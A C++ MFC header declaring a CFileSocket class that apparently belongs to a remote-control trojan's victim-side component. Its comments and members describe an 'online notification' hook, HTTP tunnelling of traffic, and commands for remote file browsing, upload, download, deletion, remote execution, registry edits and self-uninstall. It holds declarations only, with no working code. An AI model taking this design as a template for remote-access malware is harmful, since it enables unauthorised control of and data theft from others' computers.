//Download by http://www.NewXing.com
// FileSocket.h: interface for the CFileSocket class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_FILESOCKET_H__8B751501_1864_11D5_89D9_1CA905C10000__INCLUDED_)
#define AFX_FILESOCKET_H__8B751501_1864_11D5_89D9_1CA905C10000__INCLUDED_

#if _MSC_VER >= 1000
#pragma once
#endif // _MSC_VER >= 1000

#include <afxinet.h>
//*************************************
#pragma pack(1) //字节对齐

#pragma pack()	//使用缺省对齐
//*************************************

class CFileSocket  
{
public:
	CFileSocket();
	virtual ~CFileSocket();

public:
	//*****************************************************************
	////////////////////////成员变量/////////////////////////////
	CCommunity*			m_pCommunity;		//上线通知类的指针

	CString				m_strServerIP;		//服务器的IP地址(即客户端)

	SOCKET				m_hConnectSocket;	//连接Socket

	CInternetSession*	m_pSession;			//HTTP隧道连接的Internet会话
	CHttpConnection*	m_pHttpConn;		//HTTP隧道连接的HTTP连接
	CHttpFile*			m_pHttpFile;		//HTTP隧道连接的HTTP文件
	////////////////////////成员函数/////////////////////////////
	void	Initial();
	void	OnSocketClose();
	void	ConnectServer();
	void	RecvCommand(DWORD dwCommandID=0);
	//*****************************************************************
private:
	//*****************************************************************
	////////////////////////成员变量/////////////////////////////
	CByteArray		m_ArrayBuffer;
	////////////////////////成员函数/////////////////////////////
	void	CStringToChar(char* cText,CString strText,UINT nSize=NULL);
	CString	CharToCString(char* cText,UINT nSize);
	CString GetDiskVolume(CString strDiskDriveName);
	DWORDLONG GetDiskSpace(CString strDiskDriver,BOOL bFreeSpace);
	void	SearchFile_GetOperationObject(CString strFindDir,
	int		nPathLen,CByteArray* pArrayBuffer);
	void	CreateMultilevelDir(CString strDirName);
	void	FolderStatistic(CString strFindDir,int* nFileCount,int* nFolderCount,DWORD* dwTotalSize);
	void	RegDeleteValue(HKEY hKey,CString sKey,CString sChildKey);
	void	SearchFile(CString strFindDir,CString strFindFile,BOOL bSearchSubdir,CByteArray* pArrayBuffer);
	BOOL	IsFileExist(CString strFilename);//查找指定文件是否存在

	void	Command_IDVerify();
	void	Command_DownloadDiskDriveInfo();
	void	Command_ExpandDirectory();
	void	Command_ShowFileList();
	void	Command_RenameFile();
	void	Command_NewFile();
	void	Command_NewFolder();
	void	Command_DeleteFile();
	void	Command_RemotePaste();
	void	Command_GetOperationObject();
	void	Command_DownloadFile();
	void	Command_UploadFile();
	void	Command_ShowProperty_Multi();
	void	Command_ShowProperty_Single();
	void	Command_ModifyProperty_Single();
	void	Command_ShowProperty_Diskdrive();
	void	Command_ModifyProperty_Diskdrive();
	void	Command_RemoteRun();
	void	Command_RemoteUninstall();
	void	Command_FindFile();
	void	Command_ShowNote();
	void	Command_GetFileInfo();

	DWORD	RecvCommandParamSize(SOCKET hSocket);//接收命令参数大小
	BOOL	RecvCommandParam(SOCKET hSocket,BYTE* byBuf,DWORD dwBufSize);//接收命令参数
	BOOL	SendCommandData(SOCKET hSocket,int nControlCode,BYTE* byBuf,DWORD dwBufSize);//接收命令数据

	BOOL	CFileSocket::HttpTunnelSendHeader(UINT nCount);//发送HTTP头
	BOOL	CFileSocket::HttpTunnelSend(const void* lpBuf,UINT nCount);//发送HTTP数据
	BOOL	CFileSocket::HttpTunnelRecvHeader();//接收HTTP头
	int		CFileSocket::HttpTunnelRecv(void* lpBuf,UINT nCount);//接收HTTP数据
	//*****************************************************************
};

#endif // !defined(AFX_FILESOCKET_H__8B751501_1864_11D5_89D9_1CA905C10000__INCLUDED_)
